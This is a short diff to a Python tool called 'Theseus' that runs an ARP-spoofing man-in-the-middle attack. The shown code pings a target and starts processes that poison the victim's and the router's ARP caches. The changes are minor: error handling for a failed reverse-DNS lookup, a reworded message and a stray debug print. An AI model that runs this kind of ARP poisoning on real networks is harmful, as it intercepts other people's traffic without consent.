@@ -69,7 +69,7 @@ class Theseus(object):
 			arp = Arp_Spoof(args.interface)
 
 			p = Arp_Ping(args.interface)
-			sys.stdout.write("[\033[1;34m+\033[00m] Sending arp ping to {} \n".format(args.target))
+			sys.stdout.write("[\033[1;34m+\033[00m] Sending arp ping for {} \n".format(args.target))
 			p.ping(args.target)
 			while True:
 				tm = p.await_responce(args.interface)
@@ -78,7 +78,10 @@ class Theseus(object):
 						break
 				except TypeError: pass
 			tm = tm[0]
-			sys.stdout.write("[\033[1;32m+\033[00m] {} ({}) is at {}\n".format(socket.gethostbyaddr(args.target)[0], args.target, tm))
+			try:
+				sys.stdout.write("[\033[1;32m+\033[00m] {} ({}) is at {}\n".format(socket.gethostbyaddr(args.target)[0], args.target, tm))
+			except socket.herror:
+				sys.stdout.write("[\033[1;32m+\033[00m] {} is at {}\n".format(args.target, tm))
 
 			ajobs = []
 			victim_thread = multiprocessing.Process(target=arp.poison_victim, args=(args.target, router, int(verbose), args.interface, tm))
@@ -91,7 +94,7 @@ class Theseus(object):
 			target_thread = multiprocessing.Process(target=arp.poison_router, args=(router, args.target, int(verbose), args.interface, tm))
 			ajobs.append(victim_thread)
 			target_thread.start()
-			rname = socket.gethostbyaddr(router)[0]
+			rname = socket.gethostbyaddr(router)[0]	
 			rname = rname.replace('.home', " ")
 			sys.stdout.write("[\033[1;32m+\033[00m] Started attack on {}\n".format(rname))
 
@@ -121,5 +124,6 @@ if __name__ == '__main__':
 	t = Theseus()
 	try:
 		t.attack_arp_to_proxy()
+		print("S")
 	except KeyboardInterrupt:
 		exit()
